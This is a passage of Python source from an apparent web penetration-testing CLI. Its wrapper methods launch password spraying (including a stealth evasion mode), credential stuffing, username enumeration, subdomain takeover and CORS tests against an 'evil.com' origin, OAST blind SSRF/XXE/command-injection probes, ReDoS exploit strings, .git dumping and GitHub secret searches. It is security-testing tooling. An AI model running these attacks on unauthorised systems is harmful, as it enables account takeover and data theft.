            console.print("[green][+] No valid credentials found via password spraying[/green]")

    def _scan_credential_stuffing(self):
        """215: Credential Stuffing (Leaked DB)"""
        console.print(f"\n[bold red][*] CREDENTIAL STUFFING on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold red]Running credential stuffing...[/bold red]"):
            result = run_credential_scan(self.target, scan_type='stuff')
        self.results['findings']['credential_stuffing'] = result
        if result.get('vulnerable'):
            console.print(f"[bold red][!!!] VALID CREDENTIALS FOUND![/bold red]")
            for cred in result.get('details', {}).get('valid_credentials', []):
                console.print(f"  [red]{cred.get('username')}:{cred.get('password')} ({cred.get('method')})[/red]")
        else:
            console.print("[green][+] No valid credentials found via credential stuffing[/green]")

    def _scan_username_enumeration(self):
        """216: Username Enumeration (Auth Response Analysis)"""
        console.print(f"\n[bold red][*] USERNAME ENUMERATION on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold red]Running username enumeration...[/bold red]"):
            result = run_credential_scan(self.target, scan_type='enum')
        self.results['findings']['username_enumeration'] = result
        if result.get('vulnerable'):
            valid_users = result.get('details', {}).get('valid_users', [])
            console.print(f"[bold red][!] Username enumeration possible! {len(valid_users)} users found[/bold red]")
            for u in valid_users[:10]:
                console.print(f"  [yellow]{u}[/yellow]")
        else:
            console.print("[green][+] No username enumeration possible[/green]")

    def _scan_auth_testing_full(self):
        """217: Auth Testing Full (Basic + Form + API)"""
        console.print(f"\n[bold red][*] FULL AUTH TESTING on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        all_results = {}
        with console.status("[bold red]Phase 1: HTTP Basic Auth Testing...[/bold red]"):
            all_results['basic'] = run_credential_scan(self.target, scan_type='basic')
        with console.status("[bold red]Phase 2: HTTP Form Auth Testing...[/bold red]"):
            all_results['form'] = run_credential_scan(self.target, scan_type='form')
        with console.status("[bold red]Phase 3: API Auth Testing...[/bold red]"):
            all_results['api'] = run_credential_scan(self.target, scan_type='api')
        self.results['findings']['auth_testing_full'] = all_results
        vuln_types = [k for k, v in all_results.items() if v and v.get('vulnerable')]
        if vuln_types:
            console.print(f"[bold red][!!!] AUTH VULNERABILITIES FOUND: {', '.join(vuln_types)}[/bold red]")
        else:
            console.print("[green][+] No auth vulnerabilities detected[/green]")

    def _scan_takeover_advanced_check(self):
        """218: Subdomain Takeover Check Advanced (30+ Services)"""
        console.print(f"\n[bold red][*] SUBDOMAIN TAKEOVER CHECK on {self.target}[/bold red]")
        with console.status("[bold red]Checking subdomain takeover (30+ services)...[/bold red]"):
            result = run_takeover_advanced_scan(self.target, scan_type='check')
        self.results['findings']['takeover_advanced_check'] = result
        if result.get('vulnerable'):
            console.print(f"[bold red][!!!] SUBDOMAIN TAKEOVER VULNERABLE![/bold red]")
            for f in result.get('findings', []):
                if f.get('type') == 'subdomain_takeover':
                    console.print(f"  [red]{f.get('description', '')[:100]}[/red]")
        else:
            console.print("[green][+] No subdomain takeover detected[/green]")

    def _scan_takeover_advanced_mass(self):
        """219: Subdomain Takeover Mass Scan"""
        console.print(f"\n[bold red][*] SUBDOMAIN TAKEOVER MASS SCAN on {self.target}[/bold red]")
        with console.status("[bold red]Mass scanning subdomains for takeover...[/bold red]"):
            result = run_takeover_advanced_scan(self.target, scan_type='mass')
        self.results['findings']['takeover_advanced_mass'] = result
        vuln_subs = result.get('details', {}).get('vulnerable_subdomains', [])
        if vuln_subs:
            console.print(f"[bold red][!!!] {len(vuln_subs)} VULNERABLE SUBDOMAINS![/bold red]")
            for sub in vuln_subs[:10]:
                console.print(f"  [red]{sub}[/red]")
        else:
            console.print("[green][+] No vulnerable subdomains found[/green]")

    def _scan_takeover_advanced_cname(self):
        """220: Subdomain Takeover CNAME Verify"""
        console.print(f"\n[bold red][*] CNAME VERIFICATION on {self.target}[/bold red]")
        with console.status("[bold red]Verifying CNAME records...[/bold red]"):
            result = run_takeover_advanced_scan(self.target, scan_type='cname')
        self.results['findings']['takeover_advanced_cname'] = result
        cname = result.get('details', {}).get('cname')
        if cname:
            console.print(f"[yellow][!] CNAME found: {cname}[/yellow]")
        else:
            console.print("[green][+] No CNAME records found or domain doesn't resolve[/green]")

    def _scan_takeover_advanced_full(self):
        """221: Subdomain Takeover Full Scan"""
        console.print(f"\n[bold red][*] SUBDOMAIN TAKEOVER FULL SCAN on {self.target}[/bold red]")
        with console.status("[bold red]Running full subdomain takeover scan...[/bold red]"):
            result = run_takeover_advanced_scan(self.target, scan_type='full')
        self.results['findings']['takeover_advanced_full'] = result
        vuln_subs = result.get('details', {}).get('vulnerable_subdomains', [])
        if vuln_subs:
            console.print(f"[bold red][!!!] {len(vuln_subs)} VULNERABLE SUBDOMAINS![/bold red]")
            for sub in vuln_subs[:15]:
                console.print(f"  [red]{sub}[/red]")
        else:
            console.print("[green][+] No subdomain takeover vulnerabilities detected[/green]")

    def _scan_cors_advanced_origin(self):
        """222: CORS Origin Test (CorsonE Fusion)"""
        console.print(f"\n[bold red][*] CORS ORIGIN TEST on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold red]Testing CORS origin reflection...[/bold red]"):
            result = run_cors_advanced_scan(self.target, scan_type='origin', origin='https://evil.com')
        self.results['findings']['cors_advanced_origin'] = result
        if result.get('vulnerable'):
            console.print(f"[bold red][!] CORS misconfiguration detected![/bold red]")
            for f in result.get('findings', []):
                console.print(f"  [red]{f.get('description', '')[:100]}[/red]")
        else:
            console.print("[green][+] No CORS origin reflection[/green]")

    def _scan_cors_advanced_null(self):
        """223: CORS Null Origin Test"""
        console.print(f"\n[bold red][*] CORS NULL ORIGIN TEST on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold red]Testing null origin...[/bold red]"):
            result = run_cors_advanced_scan(self.target, scan_type='null')
        self.results['findings']['cors_advanced_null'] = result
        if result.get('vulnerable'):
            console.print(f"[bold red][!!!] NULL ORIGIN ACCEPTED - Critical![/bold red]")
        else:
            console.print("[green][+] Null origin not accepted[/green]")

    def _scan_cors_advanced_subdomain(self):
        """224: CORS Subdomain Bypass"""
        console.print(f"\n[bold red][*] CORS SUBDOMAIN BYPASS TEST on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold red]Testing subdomain bypass patterns...[/bold red]"):
            result = run_cors_advanced_scan(self.target, scan_type='subdomain')
        self.results['findings']['cors_advanced_subdomain'] = result
        if result.get('vulnerable'):
            console.print(f"[bold red][!] CORS subdomain bypass detected![/bold red]")
            for f in result.get('findings', []):
                console.print(f"  [red]{f.get('description', '')[:100]}[/red]")
        else:
            console.print("[green][+] No CORS subdomain bypass[/green]")

    def _scan_cors_advanced_misconfig(self):
        """225: CORS Misconfiguration Detect"""
        console.print(f"\n[bold red][*] CORS MISCONFIGURATION DETECT on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold red]Detecting CORS misconfiguration...[/bold red]"):
            result = run_cors_advanced_scan(self.target, scan_type='misconfig')
        self.results['findings']['cors_advanced_misconfig'] = result
        if result.get('vulnerable'):
            console.print(f"[bold red][!!!] CORS MISCONFIGURATION DETECTED![/bold red]")
            for f in result.get('findings', []):
                if f.get('severity') in ['High', 'Critical']:
                    console.print(f"  [red]{f.get('type')}: {f.get('description', '')[:100]}[/red]")
        else:
            console.print("[green][+] No CORS misconfiguration detected[/green]")

    def _scan_cors_advanced_full(self):
        """226: CORS Full Scan (CORScanner Fusion)"""
        console.print(f"\n[bold red][*] CORS FULL SCAN on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold red]Running full CORS scan (all tests)...[/bold red]"):
            result = run_cors_advanced_scan(self.target, scan_type='full')
        self.results['findings']['cors_advanced_full'] = result
        if result.get('vulnerable'):
            console.print(f"[bold red][!!!] CORS VULNERABILITIES FOUND![/bold red]")
            for f in result.get('findings', []):
                if f.get('severity') in ['High', 'Critical']:
                    console.print(f"  [red]{f.get('type')}: {f.get('description', '')[:100]}[/red]")
        else:
            console.print("[green][+] No CORS vulnerabilities detected[/green]")

    def _scan_password_spraying_stealth(self):
        """227: Password Spraying Stealth (Enhanced Evasion)"""
        console.print(f"\n[bold red][*] STEALTH PASSWORD SPRAYING on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold red]Running stealth password spraying (enhanced evasion)...[/bold red]"):
            result = run_credential_scan(self.target, scan_type='stealth')
        self.results['findings']['password_spraying_stealth'] = result
        if result.get('vulnerable'):
            console.print(f"[bold red][!!!] VALID CREDENTIALS FOUND![/bold red]")
            for cred in result.get('details', {}).get('valid_credentials', []):
                console.print(f"  [red]{cred.get('username')}:{cred.get('password')}[/red]")
        else:
            console.print("[green][+] No valid credentials found via stealth spraying[/green]")

    def _scan_api_auth_testing(self):
        """228: API Auth Testing"""
        console.print(f"\n[bold red][*] API AUTH TESTING on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold red]Testing API authentication...[/bold red]"):
            result = run_credential_scan(self.target, scan_type='api')
        self.results['findings']['api_auth_testing'] = result
        if result.get('vulnerable'):
            console.print(f"[bold red][!] API auth vulnerabilities detected![/bold red]")
            for f in result.get('findings', []):
                console.print(f"  [yellow]{f.get('type')}: {f.get('description', '')[:100]}[/yellow]")
        else:
            console.print("[green][+] No API auth vulnerabilities[/green]")

    def _scan_http_form_auth(self):
        """229: HTTP Form Auth Testing"""
        console.print(f"\n[bold red][*] HTTP FORM AUTH TESTING on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold red]Testing HTTP form authentication...[/bold red]"):
            result = run_credential_scan(self.target, scan_type='form')
        self.results['findings']['http_form_auth'] = result
        if result.get('vulnerable'):
            console.print(f"[bold red][!!!] VALID FORM CREDENTIALS FOUND![/bold red]")
            for cred in result.get('details', {}).get('valid_credentials', []):
                console.print(f"  [red]{cred.get('username')}:{cred.get('password')}[/red]")
        else:
            console.print("[green][+] No valid form credentials found[/green]")

    def _scan_takeover_advanced_service_verify(self):
        """230: Subdomain Takeover Service Verify"""
        console.print(f"\n[bold red][*] SUBDOMAIN TAKEOVER SERVICE VERIFY on {self.target}[/bold red]")
        with console.status("[bold red]Running service-specific verification...[/bold red]"):
            result = run_takeover_advanced_scan(self.target, scan_type='verify', service='GitHub Pages')
        self.results['findings']['takeover_service_verify'] = result
        if result.get('vulnerable'):
            console.print(f"[bold red][!!!] SERVICE TAKEOVER CONFIRMED![/bold red]")
        else:
            console.print("[green][+] No service takeover confirmed[/green]")

    def _scan_cors_advanced_credential(self):
        """231: CORS Credential Inclusion"""
        console.print(f"\n[bold red][*] CORS CREDENTIAL INCLUSION TEST on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold red]Testing CORS credential inclusion...[/bold red]"):
            result = run_cors_advanced_scan(self.target, scan_type='credential')
        self.results['findings']['cors_credential_inclusion'] = result
        if result.get('vulnerable'):
            console.print(f"[bold red][!!!] CREDENTIALS EXPOSED VIA CORS![/bold red]")
            for f in result.get('findings', []):
                console.print(f"  [red]{f.get('description', '')[:100]}[/red]")
        else:
            console.print("[green][+] No credential inclusion vulnerability[/green]")

    def _scan_cors_csrf_chain(self):
        """232: CORS + CSRF Chain Detection"""
        console.print(f"\n[bold red][*] CORS + CSRF CHAIN DETECTION on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold red]Detecting CORS + CSRF chains...[/bold red]"):
            result = run_cors_advanced_scan(self.target, scan_type='full')
        # Check specifically for CSRF chain findings
        csrf_findings = [f for f in result.get('findings', []) if 'csrf' in f.get('type', '').lower()]
        self.results['findings']['cors_csrf_chain'] = result
        if csrf_findings:
            console.print(f"[bold red][!!!] CORS + CSRF CHAIN DETECTED![/bold red]")
            for f in csrf_findings:
                console.print(f"  [red]{f.get('description', '')[:100]}[/red]")
        else:
            console.print("[green][+] No CORS + CSRF chain detected[/green]")

    def _scan_credential_full(self):
        """233: Credential Full Scan (All Cred Checks)"""
        console.print(f"\n[bold red][*] CREDENTIAL FULL SCAN on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        all_results = {}
        with console.status("[bold red]Phase 1: Password Spraying...[/bold red]"):
            all_results['spray'] = run_credential_scan(self.target, scan_type='spray')
        with console.status("[bold red]Phase 2: Credential Stuffing...[/bold red]"):
            all_results['stuff'] = run_credential_scan(self.target, scan_type='stuff')
        with console.status("[bold red]Phase 3: Username Enumeration...[/bold red]"):
            all_results['enum'] = run_credential_scan(self.target, scan_type='enum')
        with console.status("[bold red]Phase 4: HTTP Basic Auth...[/bold red]"):
            all_results['basic'] = run_credential_scan(self.target, scan_type='basic')
        with console.status("[bold red]Phase 5: HTTP Form Auth...[/bold red]"):
            all_results['form'] = run_credential_scan(self.target, scan_type='form')
        with console.status("[bold red]Phase 6: API Auth...[/bold red]"):
            all_results['api'] = run_credential_scan(self.target, scan_type='api')
        self.results['findings']['credential_full'] = all_results
        vuln_types = [k for k, v in all_results.items() if v and v.get('vulnerable')]
        if vuln_types:
            console.print(f"[bold red][!!!] CREDENTIAL VULNERABILITIES FOUND: {', '.join(vuln_types)}[/bold red]")
        else:
            console.print("[green][+] No credential vulnerabilities detected across all scan types[/green]")
        for name, res in all_results.items():
            if res:
                findings_count = len(res.get('findings', []))
                console.print(f"  [cyan]{name}: {findings_count} findings[/cyan]")

    # ========================================================================
    # v5.0 FUSION Batch 7 - OAST/Callback + ReDoS/CSP + Git Advanced (Task 5a)
    # Scan IDs 234-253
    # ========================================================================

    def _scan_oast_blind_ssrf(self):
        """234: OAST Blind SSRF Test"""
        console.print(f"\n[bold red][*] OAST BLIND SSRF TEST on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold red]Testing blind SSRF via OAST callback...[/bold red]"):
            result = run_oast_scan(self.target, scan_type='ssrf')
        self.results['findings']['oast_blind_ssrf'] = result
        if result and result.get('vulnerable'):
            console.print(f"[bold red][!!!] BLIND SSRF DETECTED via OAST callback![/bold red]")
            for f in result.get('findings', []):
                console.print(f"  [red]- {f.get('description', '')[:100]}[/red]")
        else:
            console.print("[green][+] No blind SSRF detected via OAST callback[/green]")

    def _scan_oast_blind_xxe(self):
        """235: OAST Blind XXE Test"""
        console.print(f"\n[bold red][*] OAST BLIND XXE TEST on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold red]Testing blind XXE via OAST callback...[/bold red]"):
            result = run_oast_scan(self.target, scan_type='xxe')
        self.results['findings']['oast_blind_xxe'] = result
        if result and result.get('vulnerable'):
            console.print(f"[bold red][!!!] BLIND XXE DETECTED via OAST callback![/bold red]")
            for f in result.get('findings', []):
                console.print(f"  [red]- {f.get('description', '')[:100]}[/red]")
        else:
            console.print("[green][+] No blind XXE detected via OAST callback[/green]")

    def _scan_oast_blind_cmdi(self):
        """236: OAST Blind Cmd Injection Test"""
        console.print(f"\n[bold red][*] OAST BLIND CMD INJECTION TEST on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold red]Testing blind command injection via OAST callback...[/bold red]"):
            result = run_oast_scan(self.target, scan_type='cmdi')
        self.results['findings']['oast_blind_cmdi'] = result
        if result and result.get('vulnerable'):
            console.print(f"[bold red][!!!] BLIND COMMAND INJECTION DETECTED via OAST callback![/bold red]")
            for f in result.get('findings', []):
                console.print(f"  [red]- {f.get('description', '')[:100]}[/red]")
        else:
            console.print("[green][+] No blind command injection detected via OAST callback[/green]")

    def _scan_oast_blind_xss(self):
        """237: OAST Blind XSS Test"""
        console.print(f"\n[bold red][*] OAST BLIND XSS TEST on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold red]Testing blind XSS via OAST callback...[/bold red]"):
            result = run_oast_scan(self.target, scan_type='xss')
        self.results['findings']['oast_blind_xss'] = result
        if result and result.get('vulnerable'):
            console.print(f"[bold red][!!!] BLIND XSS DETECTED via OAST callback![/bold red]")
            for f in result.get('findings', []):
                console.print(f"  [red]- {f.get('description', '')[:100]}[/red]")
        else:
            console.print("[green][+] No blind XSS detected via OAST callback (may trigger later)[/green]")

    def _scan_oast_full_callback(self):
        """238: OAST Full Callback Scan"""
        console.print(f"\n[bold red][*] OAST FULL CALLBACK SCAN on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold red]Running full OAST callback scan (SSRF + XXE + CmdI + XSS)...[/bold red]"):
            result = run_oast_scan(self.target, scan_type='full')
        self.results['findings']['oast_full'] = result
        vuln_types = [k for k, v in result.get('details', {}).items()
                      if isinstance(v, dict) and v.get('vulnerable')]
        if result and result.get('vulnerable'):
            console.print(f"[bold red][!!!] OAST VULNERABILITIES FOUND: {', '.join(vuln_types)}[/bold red]")
        else:
            console.print("[green][+] No OAST vulnerabilities detected[/green]")

    def _scan_redos_detection(self):
        """239: ReDoS Detection"""
        console.print(f"\n[bold red][*] REDOS DETECTION[/bold red]")
        pattern = Prompt.ask("[bold yellow]Enter regex pattern to analyze[/bold yellow]",
                            default="(a+)+$")
        with console.status(f"[bold red]Analyzing regex pattern for ReDoS...[/bold red]"):
            result = run_redos_csp_scan(self.target, scan_type='redos', pattern=pattern)
        self.results['findings']['redos_detection'] = result
        if result and result.get('vulnerable'):
            console.print(f"[bold red][!!!] ReDoS VULNERABILITY DETECTED![/bold red]")
            for f in result.get('findings', []):
                console.print(f"  [red]- [{f.get('severity')}] {f.get('description', '')[:100]}[/red]")
        else:
            console.print("[green][+] No ReDoS vulnerability detected[/green]")

    def _scan_csp_analysis_adv(self):
        """240: CSP Analysis"""
        console.print(f"\n[bold red][*] CSP ANALYSIS on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold red]Analyzing Content Security Policy...[/bold red]"):
            result = run_redos_csp_scan(self.target, scan_type='csp')
        self.results['findings']['csp_analysis'] = result
        if result and result.get('vulnerable'):
            console.print(f"[bold red][!!!] CSP MISCONFIGURATIONS FOUND![/bold red]")
            for f in result.get('findings', []):
                console.print(f"  [yellow]- {f.get('description', '')[:100]}[/yellow]")
        else:
            console.print("[green][+] CSP appears properly configured[/green]")

    def _scan_csp_bypass_finder(self):
        """241: CSP Bypass Finder"""
        console.print(f"\n[bold red][*] CSP BYPASS FINDER on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold red]Finding CSP bypass techniques...[/bold red]"):
            result = run_redos_csp_scan(self.target, scan_type='csp_bypass')
        self.results['findings']['csp_bypass'] = result
        bypasses = result.get('details', {}).get('bypasses', [])
        if result and result.get('vulnerable'):
            console.print(f"[bold red][!!!] {len(bypasses)} CSP BYPASSES FOUND![/bold red]")
            for b in bypasses[:10]:
                console.print(f"  [yellow]- [{b.get('severity')}] {b.get('type')}: {b.get('description', '')[:80]}[/yellow]")
        else:
            console.print("[green][+] No critical/high CSP bypasses found[/green]")

    def _scan_csp_redos_full(self):
        """242: CSP + ReDoS Full Scan"""
        console.print(f"\n[bold red][*] CSP + REDOS FULL SCAN on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold red]Running full CSP + ReDoS analysis...[/bold red]"):
            result = run_redos_csp_scan(self.target, scan_type='full')
        self.results['findings']['csp_redos_full'] = result
        if result and result.get('vulnerable'):
            console.print(f"[bold red][!!!] CSP/ReDoS VULNERABILITIES FOUND![/bold red]")
            findings = result.get('findings', [])
            console.print(f"  [yellow]Total findings: {len(findings)}[/yellow]")
        else:
            console.print("[green][+] No CSP/ReDoS vulnerabilities detected[/green]")

    def _scan_git_exposure_adv(self):
        """243: Git Exposure Detection"""
        console.print(f"\n[bold red][*] GIT EXPOSURE DETECTION on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold red]Checking for .git directory exposure...[/bold red]"):
            result = run_git_advanced_scan(self.target, scan_type='detect')
        self.results['findings']['git_exposure_adv'] = result
        if result and result.get('vulnerable'):
            console.print(f"[bold red][!!!] GIT DIRECTORY EXPOSED![/bold red]")
            exposed = result.get('details', {}).get('exposed_paths', [])
            console.print(f"  [red]Exposed paths: {len(exposed)}[/red]")
        else:
            console.print("[green][+] No git exposure detected[/green]")

    def _scan_git_repo_dump(self):
        """244: Git Repo Dump"""
        console.print(f"\n[bold red][*] GIT REPO DUMP on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold red]Attempting git repository dump...[/bold red]"):
            result = run_git_advanced_scan(self.target, scan_type='dump')
        self.results['findings']['git_repo_dump'] = result
        files_recovered = result.get('details', {}).get('files_recovered', [])
        if result and result.get('vulnerable'):
            console.print(f"[bold red][!!!] RECOVERED {len(files_recovered)} files from .git![/bold red]")
            total_size = result.get('details', {}).get('total_size', 0)
            console.print(f"  [red]Total size: {total_size} bytes[/red]")
        else:
            console.print("[green][+] Could not dump git repository[/green]")

    def _scan_github_dork_search(self):
        """245: GitHub Dork Search"""
        console.print(f"\n[bold red][*] GITHUB DORK SEARCH for {self.target}[/bold red]")
        with console.status("[bold red]Searching GitHub for secrets...[/bold red]"):
            result = run_git_advanced_scan(self.target, scan_type='dork')
        self.results['findings']['github_dork'] = result
        secrets = result.get('details', {}).get('secrets_found', [])
        results_found = result.get('details', {}).get('results_found', [])
        if result and result.get('vulnerable'):
            console.print(f"[bold red][!!!] {len(secrets)} SECRETS FOUND ON GITHUB![/bold red]")
        elif results_found:
            console.print(f"[yellow][?] {len(results_found)} potential results (review recommended)[/yellow]")
        else:
            console.print("[green][+] No sensitive data found on GitHub[/green]")

    def _scan_svn_hg_bzr_exposure(self):
        """246: SVN/HG/BZR Exposure Detection"""
        console.print(f"\n[bold red][*] SVN/HG/BZR EXPOSURE DETECTION on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold red]Checking for SVN/Mercurial/Bazaar exposure...[/bold red]"):
            result = run_git_advanced_scan(self.target, scan_type='svn')
        self.results['findings']['svn_hg_bzr'] = result
        if result and result.get('vulnerable'):
            console.print(f"[bold red][!!!] VCS METADATA EXPOSED![/bold red]")
            details = result.get('details', {})
            vcs_types = []
            if details.get('svn_exposed'): vcs_types.append('SVN')
            if details.get('hg_exposed'): vcs_types.append('Mercurial')
            if details.get('bzr_exposed'): vcs_types.append('Bazaar')
            console.print(f"  [red]Exposed: {', '.join(vcs_types)}[/red]")
        else:
            console.print("[green][+] No SVN/HG/BZR exposure detected[/green]")

    def _scan_git_full_security(self):
        """247: Git Full Security Scan"""
        console.print(f"\n[bold red][*] GIT FULL SECURITY SCAN on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold red]Running full git security scan (exposure + dump + dork + SVN)...[/bold red]"):
            result = run_git_advanced_scan(self.target, scan_type='full')
        self.results['findings']['git_full'] = result
        if result and result.get('vulnerable'):
            console.print(f"[bold red][!!!] GIT SECURITY ISSUES FOUND![/bold red]")
            findings = result.get('findings', [])
            console.print(f"  [red]Total findings: {len(findings)}[/red]")
        else:
            console.print("[green][+] No git security issues detected[/green]")

    def _scan_oast_callback_server(self):
        """248: OAST Callback Server"""
        console.print(f"\n[bold red][*] OAST CALLBACK SERVER[/bold red]")
        port = Prompt.ask("[bold yellow]Enter callback port[/bold yellow]", default="8080")
        with console.status(f"[bold red]Starting OAST callback server on port {port}...[/bold red]"):
            result = run_oast_scan(self.target, scan_type='callback_server',
                                  callback_port=int(port))
        self.results['findings']['oast_callback_server'] = result
        if result and result.get('running'):
            console.print(f"[bold green][+] OAST callback server running on port {port}[/bold green]")
            console.print(f"  [cyan]Callback URL: http://<your-ip>:{port}/<payload_id>/[/cyan]")
        else:
            console.print(f"[bold red][!] Failed to start callback server[/bold red]")

    def _scan_redos_exploit_gen(self):
        """249: ReDoS Exploit String Gen"""
        console.print(f"\n[bold red][*] REDOS EXPLOIT STRING GENERATOR[/bold red]")
        pattern = Prompt.ask("[bold yellow]Enter regex pattern[/bold yellow]",
                            default="(a+)+$")
        with console.status("[bold red]Generating exploit strings for ReDoS...[/bold red]"):
            result = run_redos_csp_scan(self.target, scan_type='redos_exploit', pattern=pattern)
        self.results['findings']['redos_exploit'] = result
        exploits = result.get('details', {}).get('exploit_strings', [])
        confirmed = result.get('details', {}).get('confirmed_exploits', [])
        if confirmed:
            console.print(f"[bold red][!!!] {len(confirmed)} CONFIRMED exploit strings![/bold red]")
        elif exploits:
            console.print(f"[yellow][?] Generated {len(exploits)} candidate exploit strings[/yellow]")
            for e in exploits[:5]:
                console.print(f"  [cyan]- {e.get('string', '')[:60]} ({e.get('description', '')[:60]})[/cyan]")
        else:
            console.print("[green][+] No exploit strings generated[/green]")

    def _scan_csp_xss_bypass(self):
        """250: CSP XSS Bypass Test"""
        console.print(f"\n[bold red][*] CSP XSS BYPASS TEST on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold red]Testing XSS through CSP...[/bold red]"):
            result = run_redos_csp_scan(self.target, scan_type='csp_xss')
        self.results['findings']['csp_xss_bypass'] = result
        if result and result.get('vulnerable'):
            console.print(f"[bold red][!!!] CSP CAN BE BYPASSED FOR XSS![/bold red]")
            bypasses = result.get('details', {}).get('successful_bypasses', [])
            console.print(f"  [red]Successful bypasses: {', '.join(bypasses)}[/red]")
        else:
            console.print("[green][+] No CSP XSS bypasses found[/green]")

    def _scan_git_secret_scan(self):
        """251: Git Secret Scan"""
        console.print(f"\n[bold red][*] GIT SECRET SCAN on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold red]Scanning repository for secrets...[/bold red]"):
            result = run_git_advanced_scan(self.target, scan_type='secrets')
        self.results['findings']['git_secret_scan'] = result
        secrets = result.get('details', {}).get('secrets_found', [])
        if result and result.get('vulnerable'):
            console.print(f"[bold red][!!!] {len(secrets)} SECRETS FOUND IN REPOSITORY![/bold red]")
            for s in secrets[:5]:
                console.print(f"  [red]- [{s.get('severity')}] {s.get('type')}: {s.get('match', '')[:60]}[/red]")
        else:
            console.print("[green][+] No secrets found in repository[/green]")

    def _scan_github_code_search(self):
        """252: GitHub Code Search"""
        console.print(f"\n[bold red][*] GITHUB CODE SEARCH for {self.target}[/bold red]")
        query = Prompt.ask("[bold yellow]Enter search query (or press enter for domain)[/bold yellow]",
                          default=self.target)
        with console.status("[bold red]Searching GitHub code...[/bold red]"):
            result = run_git_advanced_scan(query, scan_type='dork')
        self.results['findings']['github_code_search'] = result
        results_found = result.get('details', {}).get('results_found', [])
        secrets = result.get('details', {}).get('secrets_found', [])
        if secrets:
            console.print(f"[bold red][!!!] {len(secrets)} secrets found![/bold red]")
        elif results_found:
            console.print(f"[yellow][?] {len(results_found)} results found (review recommended)[/yellow]")
        else:
            console.print("[green][+] No results found[/green]")

    def _scan_redos_csp_git_combined(self):
        """253: ReDoS + CSP + Git Combined Scan"""
        console.print(f"\n[bold red][*] REDOS + CSP + GIT COMBINED SCAN on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        all_results = {}

        # Phase 1: CSP + ReDoS
        with console.status("[bold red]Phase 1: CSP + ReDoS analysis...[/bold red]"):
            all_results['csp_redos'] = run_redos_csp_scan(self.target, scan_type='full')

        # Phase 2: Git Security
        with console.status("[bold red]Phase 2: Git security scan...[/bold red]"):
            all_results['git'] = run_git_advanced_scan(self.target, scan_type='full')

        # Phase 3: OAST Callback
        with console.status("[bold red]Phase 3: OAST callback tests...[/bold red]"):
            all_results['oast'] = run_oast_scan(self.target, scan_type='full')

        self.results['findings']['redos_csp_git_combined'] = all_results

        vuln_phases = [k for k, v in all_results.items() if v and v.get('vulnerable')]
        if vuln_phases:
            console.print(f"[bold red][!!!] VULNERABILITIES FOUND IN: {', '.join(vuln_phases)}[/bold red]")
            for phase, res in all_results.items():
                if res and res.get('vulnerable'):
                    findings_count = len(res.get('findings', []))
                    console.print(f"  [red]{phase}: {findings_count} findings[/red]")
        else:
            console.print("[green][+] No vulnerabilities detected across all scan types[/green]")

    # ========================================================================
    # v5.0 FUSION Batch 7 - Web Fuzzer + ShellGen Advanced + Hash Advanced (Task 5b)
    # Scan IDs 254-273
    # ========================================================================

    def _scan_content_fuzz(self):
        """254: Content Discovery Fuzz (FFUF-style)"""
        console.print(f"\n[bold cyan][*] CONTENT DISCOVERY FUZZ on {self.target}[/bold cyan]")
        with console.status("[bold cyan]Fuzzing content (directories, files, endpoints)...[/bold cyan]"):
            result = run_web_fuzzer(self.target, scan_type='content')
        self.results['findings']['content_fuzz'] = result
        found = result.get('details', {}).get('total_found', 0)
        interesting = result.get('details', {}).get('interesting', [])
        console.print(f"  [green]Found {found} results | Interesting: {len(interesting)}[/green]")
        for f in interesting[:10]:
            status_color = 'red' if f.get('status_code') in [200] else 'yellow'
            console.print(f"  [{status_color}][{f.get('status_code')}] {f.get('url')} ({f.get('content_length', 0)} bytes)[/{status_color}]")

    def _scan_api_endpoint_fuzz(self):
        """255: API Endpoint Fuzz (Kiterunner-style)"""
        console.print(f"\n[bold magenta][*] API ENDPOINT FUZZ on {self.target}[/bold magenta]")
        with console.status("[bold magenta]Fuzzing API endpoints (Kiterunner-style)...[/bold cyan]"):
            result = run_web_fuzzer(self.target, scan_type='api')
        self.results['findings']['api_fuzz'] = result
        public = result.get('details', {}).get('public_endpoints', [])
        auth = result.get('details', {}).get('authenticated_endpoints', [])
        console.print(f"  [green]Public: {len(public)} | Auth-required: {len(auth)}[/green]")
        for f in public[:10]:
            console.print(f"  [cyan][{f.get('method')}] {f.get('url')} ({f.get('status_code')})[/cyan]")

    def _scan_parameter_fuzz(self):
        """256: Parameter Fuzz (GET/POST)"""
        console.print(f"\n[bold cyan][*] PARAMETER FUZZ on {self.target}[/bold cyan]")
        url = f"{self.protocol}{self.target}"
